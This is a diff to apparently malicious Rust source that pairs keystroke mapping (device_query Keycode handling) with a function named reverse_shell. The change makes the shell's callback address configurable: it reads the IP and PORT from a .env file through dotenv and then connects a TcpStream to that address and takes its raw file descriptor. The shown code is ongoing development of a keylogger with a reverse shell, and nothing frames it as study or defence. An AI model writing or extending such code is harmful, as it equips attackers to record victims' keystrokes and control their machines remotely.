@@ -3,6 +3,9 @@ use std::net::TcpStream;
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 use device_query::{ Keycode };
+use dotenv::dotenv;
+use std::env;
+
 
 pub fn match_case(key: &Keycode) -> &'static str {
 
@@ -38,7 +41,14 @@ pub fn match_case(key: &Keycode) -> &'static str {
 }
 
 pub fn reverse_shell() {
-    let sock = TcpStream::connect("IP:PORT").unwrap();
+    dotenv().ok();
+    
+    // read key and value from file
+    let key = env::var("IP").unwrap();
+    let value = env::var("PORT").unwrap();
+    let addr = format!("{}:{}", key, value);
+
+    let sock = TcpStream::connect(addr).unwrap();
     // created a socket, basically a file descriptor which stores the connection
 
     let fd = sock.as_raw_fd();
